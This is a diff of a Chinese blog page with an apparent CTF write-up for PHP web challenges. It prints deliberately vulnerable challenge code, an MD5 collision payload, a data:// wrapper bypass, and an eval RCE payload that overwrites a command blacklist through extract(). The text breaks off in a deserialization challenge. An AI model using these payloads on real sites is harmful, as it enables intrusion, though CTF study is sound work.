@@ -20,20 +20,35 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="# wp  # 1.  12345678910111213141516171819202122&lt;?phphighlight_file(__FILE__);error_reporting(0);header(&#x27;content-type:text&#x2F;html;charset&#x3D;utf-8&#x27;);if(isset($_GET[&#x27;I_am.IKUN&#x27;]))&amp;#12">
+  <meta name="description" content="1. 代码审计,需要用GET方式传入I_am.IKUN,这里就有一个小点,php特性,所以我们要把_换成[,在传入后就会自动识别为_, 然后就是用post方式绕过md5强碰撞,在网上找了好几个payload,没一个有用,最后才找到有效的payload,用burpsuite抓包之后,成功返回 &gt; a&#x3D;…">
 <meta property="og:type" content="article">
 <meta property="og:title" content="wp">
 <meta property="og:url" content="http://example.com/2026/09/16/05-wp/index.html">
 <meta property="og:site_name" content="Glut4micum">
-<meta property="og:description" content="# wp  # 1.  12345678910111213141516171819202122&lt;?phphighlight_file(__FILE__);error_reporting(0);header(&#x27;content-type:text&#x2F;html;charset&#x3D;utf-8&#x27;);if(isset($_GET[&#x27;I_am.IKUN&#x27;]))&amp;#12">
+<meta property="og:description" content="1. 代码审计,需要用GET方式传入I_am.IKUN,这里就有一个小点,php特性,所以我们要把_换成[,在传入后就会自动识别为_, 然后就是用post方式绕过md5强碰撞,在网上找了好几个payload,没一个有用,最后才找到有效的payload,用burpsuite抓包之后,成功返回 &gt; a&#x3D;…">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
 <meta property="article:published_time" content="2026-09-16T14:22:18.000Z">
 <meta property="article:modified_time" content="2026-09-16T14:22:18.000Z">
 <meta property="article:author" content="谷氨酸棒状杆菌">
-<meta property="article:tag" content="Web安全">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="HNUCTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="弱类型">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
 
 <link rel="canonical" href="http://example.com/2026/09/16/05-wp/">
 
@@ -235,6 +250,7 @@
               <span class="post-meta-item-text">阅读次数：</span>
               <span id="busuanzi_value_page_pv"></span>
             </span>
+            <div class="post-description">1. 代码审计,需要用GET方式传入I_am.IKUN,这里就有一个小点,php特性,所以我们要把_换成[,在传入后就会自动识别为_, 然后就是用post方式绕过md5强碰撞,在网上找了好几个payload,没一个有用,最后才找到有效的payload,用burpsuite抓包之后,成功返回 > a=…</div>
 
         </div>
       </header>
@@ -245,136 +261,76 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
-# wp
+        <h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><h1 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">if(isset($_GET[&#x27;I_am.IKUN&#x27;]))&#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;])&#123;</span><br><span class="line">        if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))&#123;</span><br><span class="line">            if(preg_match(&#x27;/Hnu_CtfisFun$/&#x27;, $_GET[&#x27;Hnu_Ctf&#x27;]) &amp;&amp; $_GET[&#x27;Hnu_Ctf&#x27;] !== &#x27;Hnu_CtfisFun&#x27;)&#123;</span><br><span class="line">                $getflag = file_get_contents($_GET[&#x27;flag&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else die(&#x27;Hnu_Ctf is not fun ! qwq 555555~&#x27;);</span><br><span class="line">            if(isset($getflag) &amp;&amp; $getflag === &#x27;BoogipopIsGod&#x27;)&#123;</span><br><span class="line">                include &#x27;flag.php&#x27;;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else die(&#x27;WDF,Air is gooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooood,too!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">else die(&quot;hash hash hash!&quot;);</span><br><span class="line">    &#125; </span><br><span class="line">else die(&quot;string string string!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else die(&#x27;WDF?you are not ikun!给👴爪巴&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-# 1.
+<p>代码审计,需要用GET方式传入I_am.IKUN,这里就有一个小点,php特性,所以我们要把_换成[,在传入后就会自动识别为_,</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/8ccf8d49-image.png" alt="image.png"></p>
+<p>然后就是用post方式绕过md5强碰撞,在网上找了好几个payload,没一个有用,最后才找到有效的payload,用burpsuite抓包之后,成功返回</p>
+<blockquote>
+<p>a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</p>
+</blockquote>
+<p>之后就是一个正则匹配的绕过,$这个符号表示从末尾开始匹配,那么我们只需要使传入的参数前面加上任意字符即可,</p>
+<p>file_get_contents:用文件的方式读取该参数,因此使用DATA伪协议进行传参</p>
+<p>最终payload</p>
+<p>GET:?I[am.IKUN&#x3D;1&amp;Hnu_Ctf&#x3D;aaaHnu_CtfisFun&amp;flag&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,BoogipopIsGod</p>
+<p>POST:a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</p>
+<p>得到flag</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/43f1caf1-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-22%20155238.png" alt="屏幕截图 2023-08-22 155238.png"></p>
+<h1 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">mb_internal_encoding(&quot;UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">$allowed = true;</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">$ban_list = [&quot;cat&quot;, &quot;flag&quot;, &quot;;&quot;, &quot;&amp;&quot;, &quot;|&quot;, &quot;`&quot;, &quot;$&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;, &quot;?&quot;, &quot;.&quot;, &quot;*&quot;, &quot;/&quot;, &quot;system&quot;, &quot;passthru&quot;, &quot;exec&quot;];</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $param) &#123;</span><br><span class="line">    foreach ($ban_list as $ban_item) &#123;</span><br><span class="line">        if (strpos($param, $ban_item) !== false) &#123;</span><br><span class="line">            $allowed = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;a&#x27;]) and isset($_GET[&#x27;b&#x27;])) &#123;</span><br><span class="line">    if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;]) &#123;</span><br><span class="line">        if ((md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;])))</span><br><span class="line">            extract($_GET);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($allowed) &#123;</span><br><span class="line">    eval($cmd);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;Nope!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">if(isset($_GET[&#x27;I_am.IKUN&#x27;]))&#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;])&#123;</span><br><span class="line">        if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))&#123;</span><br><span class="line">            if(preg_match(&#x27;/Hnu_CtfisFun$/&#x27;, $_GET[&#x27;Hnu_Ctf&#x27;]) &amp;&amp; $_GET[&#x27;Hnu_Ctf&#x27;] !== &#x27;Hnu_CtfisFun&#x27;)&#123;</span><br><span class="line">                $getflag = file_get_contents($_GET[&#x27;flag&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else die(&#x27;Hnu_Ctf is not fun ! qwq 555555~&#x27;);</span><br><span class="line">            if(isset($getflag) &amp;&amp; $getflag === &#x27;BoogipopIsGod&#x27;)&#123;</span><br><span class="line">                include &#x27;flag.php&#x27;;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else die(&#x27;WDF,Air is gooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooood,too!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">else die(&quot;hash hash hash!&quot;);</span><br><span class="line">    &#125; </span><br><span class="line">else die(&quot;string string string!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else die(&#x27;WDF?you are not ikun!给👴爪巴&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-代码审计,需要用GET方式传入I_am.IKUN,这里就有一个小点,php特性,所以我们要把_换成[,在传入后就会自动识别为_,
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/8ccf8d49-image.png)
-
-然后就是用post方式绕过md5强碰撞,在网上找了好几个payload,没一个有用,最后才找到有效的payload,用burpsuite抓包之后,成功返回
-
-> a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
-
-之后就是一个正则匹配的绕过,$这个符号表示从末尾开始匹配,那么我们只需要使传入的参数前面加上任意字符即可,
-
-file_get_contents:用文件的方式读取该参数,因此使用DATA伪协议进行传参
-
-最终payload
-
-GET:?I[am.IKUN=1&Hnu_Ctf=aaaHnu_CtfisFun&flag=data://text/plain,BoogipopIsGod
-
-POST:a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
-
-得到flag
-
-![屏幕截图 2023-08-22 155238.png](/yuque-notes/03-CTF Challenge's Writeup/assets/43f1caf1-屏幕截图 2023-08-22 155238.png)
-
-# 2.
-
+<p>涉及知识点:md5弱比较,</p>
+<h1 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h1><p>打开网页,根据提示,下载准备好的字典,放到之前收集过的爆破字典目录下,进行爆破,环境现在打不开,我就拿之前写的题的图大致讲个流程</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/f0c689d5-image.png" alt="image.png"></p>
+<p>首先选择好我们要爆破的参数</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/20d94415-image.png" alt="image.png"></p>
+<p>导入字典,爆破,即可得到密码为SSXmMs123!如果没记错</p>
+<p>然后就可以开始冤种的点击一千下了(这是冤种示范)</p>
+<p>一开始想过用burpsuite重复发包,然后失败,原因是cookie值在我们发包是不会自己改变的,在后端进行了限制</p>
+<p>正确的做法呢,是我们搞一个pythen的脚本,让电脑自己给我们点,科技解放双手,由于本人没有学过pythen,也没有配置环境,所以,就这样吧.</p>
+<h1 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h1><p>简单的游戏以及简单的rce,题目是这么描述的</p>
+<p>首先我们打开网页,就可以得到一个游戏的界面,因为之前写过几道js的题目,所以第一反应是找到js源码,尝试f12和ctrl+u都被禁止了,然后就尝试使用浏览器的按键功能</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/c3f9fdc9-image.png" alt="image.png"></p>
+<p>在这里我们就可以打开控制台,看到关键信息,打开game.js</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/61b45442-image.png" alt="image.png"></p>
+<p>一眼看过去,什么也不是,细看,可以发现有一段编码,看到有&#x3D;&#x3D;,尝试base64解码</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/49ed92cb-image.png" alt="image.png"></p>
+<p>然后,我们跳转到a_secret.php界面</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">mb_internal_encoding(&quot;UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">$allowed = true;</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">$ban_list = [&quot;cat&quot;, &quot;flag&quot;, &quot;;&quot;, &quot;&amp;&quot;, &quot;|&quot;, &quot;`&quot;, &quot;$&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;, &quot;?&quot;, &quot;.&quot;, &quot;*&quot;, &quot;/&quot;, &quot;system&quot;, &quot;passthru&quot;, &quot;exec&quot;];</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $param) &#123;</span><br><span class="line">    foreach ($ban_list as $ban_item) &#123;</span><br><span class="line">        if (strpos($param, $ban_item) !== false) &#123;</span><br><span class="line">            $allowed = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;a&#x27;]) and isset($_GET[&#x27;b&#x27;])) &#123;</span><br><span class="line">    if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;]) &#123;</span><br><span class="line">        if ((md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;])))</span><br><span class="line">            extract($_GET);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($allowed) &#123;</span><br><span class="line">    eval($cmd);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;Nope!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-涉及知识点:md5弱比较,
-
-# 3.
-
-打开网页,根据提示,下载准备好的字典,放到之前收集过的爆破字典目录下,进行爆破,环境现在打不开,我就拿之前写的题的图大致讲个流程
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/f0c689d5-image.png)
-
-首先选择好我们要爆破的参数
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/20d94415-image.png)
-
-导入字典,爆破,即可得到密码为SSXmMs123!如果没记错
-
-然后就可以开始冤种的点击一千下了(这是冤种示范)
-
-一开始想过用burpsuite重复发包,然后失败,原因是cookie值在我们发包是不会自己改变的,在后端进行了限制
-
-正确的做法呢,是我们搞一个pythen的脚本,让电脑自己给我们点,科技解放双手,由于本人没有学过pythen,也没有配置环境,所以,就这样吧.
-
-# 4.
-
-简单的游戏以及简单的rce,题目是这么描述的
-
-首先我们打开网页,就可以得到一个游戏的界面,因为之前写过几道js的题目,所以第一反应是找到js源码,尝试f12和ctrl+u都被禁止了,然后就尝试使用浏览器的按键功能
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/c3f9fdc9-image.png)
-
-在这里我们就可以打开控制台,看到关键信息,打开game.js
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/61b45442-image.png)
-
-一眼看过去,什么也不是,细看,可以发现有一段编码,看到有==,尝试base64解码
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/49ed92cb-image.png)
-
-然后,我们跳转到a_secret.php界面
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">mb_internal_encoding(&quot;UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">$allowed = true;</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">$ban_list = [&quot;cat&quot;, &quot;flag&quot;, &quot;;&quot;, &quot;&amp;&quot;, &quot;|&quot;, &quot;`&quot;, &quot;$&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;, &quot;?&quot;, &quot;.&quot;, &quot;*&quot;, &quot;/&quot;, &quot;system&quot;, &quot;passthru&quot;, &quot;exec&quot;];</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $param) &#123;</span><br><span class="line">    foreach ($ban_list as $ban_item) &#123;</span><br><span class="line">        if (strpos($param, $ban_item) !== false) &#123;</span><br><span class="line">            $allowed = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;a&#x27;]) and isset($_GET[&#x27;b&#x27;])) &#123;</span><br><span class="line">    if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;]) &#123;</span><br><span class="line">        if ((md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;])))</span><br><span class="line">            extract($_GET);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($allowed) &#123;</span><br><span class="line">    eval($cmd);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;Nope!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-这题一开始没什么思路,后来想,既然需要md5绕过,那么这个extract($_GET);就一定是有用的,直接百度,和它配套出现的就是变量覆盖,那么我们接下来就围绕这两点展开
-
-> PHP extract() :该函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素,键名用于变量名,键值用于变量值。
-
-概念非常抽象,但是大概明白了它的意思,再结合同名变量覆盖,最终我们的payload=?a=QNKCDZO&b=240610708&allowed=true&ban_list=&cmd=system('cat /flag');
-
-我害怕不保险就直接两个都该了,这段代码首先绕过md5触发extract($_GET);然后再给一个与最后判断变量名相同的变量,赋值为true以及匹配是否有黑名单内容的变量ban_list变量覆盖为空,这样我们的rce就可以正常读取了,题目给了提示flag在根目录下的flag文件夹内,直接读取
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/25ec042b-image.png)
-
-# 5.
-
-这一题前面就是信息搜集和提取,进入页面
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/597f39ac-image.png)
-
-写过类似,所以首先我想到的就是去出题人的Github主页
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/7e709ee3-image.png)
-
-看到题目名字直接点进去
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/77f3ed9d-image.png)
-
-下载源码,反序列化
-
+<p>这题一开始没什么思路,后来想,既然需要md5绕过,那么这个extract($_GET);就一定是有用的,直接百度,和它配套出现的就是变量覆盖,那么我们接下来就围绕这两点展开</p>
+<blockquote>
+<p>PHP extract() :该函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素,键名用于变量名,键值用于变量值。</p>
+</blockquote>
+<p>概念非常抽象,但是大概明白了它的意思,再结合同名变量覆盖,最终我们的payload&#x3D;?a&#x3D;QNKCDZO&amp;b&#x3D;240610708&amp;allowed&#x3D;true&amp;ban_list&#x3D;&amp;cmd&#x3D;system(‘cat &#x2F;flag’);</p>
+<p>我害怕不保险就直接两个都该了,这段代码首先绕过md5触发extract($_GET);然后再给一个与最后判断变量名相同的变量,赋值为true以及匹配是否有黑名单内容的变量ban_list变量覆盖为空,这样我们的rce就可以正常读取了,题目给了提示flag在根目录下的flag文件夹内,直接读取</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/25ec042b-image.png" alt="image.png"></p>
+<h1 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h1><p>这一题前面就是信息搜集和提取,进入页面</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/597f39ac-image.png" alt="image.png"></p>
+<p>写过类似,所以首先我想到的就是去出题人的Github主页</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/7e709ee3-image.png" alt="image.png"></p>
+<p>看到题目名字直接点进去</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/77f3ed9d-image.png" alt="image.png"></p>
+<p>下载源码,反序列化</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $isAdmin = false;</span><br><span class="line">    public $class;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;class = &#x27;home&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return __CLASS__;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 